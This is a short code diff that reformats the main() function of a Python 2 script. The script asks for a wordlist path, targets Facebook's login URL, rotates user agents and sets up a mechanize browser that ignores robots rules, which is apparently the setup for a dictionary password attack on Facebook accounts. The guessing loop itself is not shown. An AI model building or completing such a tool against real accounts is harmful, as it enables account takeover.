@@ -8,7 +8,9 @@ passwordlist = str(raw_input("Enter the wordlist name and path : "))
 login = 'https://www.facebook.com/login.php?login_attempt=1' 
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] 
 
-def main():	global br	br = mechanize.Browser()
+def main():	
+ global br	
+ br = mechanize.Browser()
  cj = cookielib.LWPCookieJar()
 br.set_handle_robots(False)	br.set_handle_redirect(True)	
 br.set_cookiejar(cj)
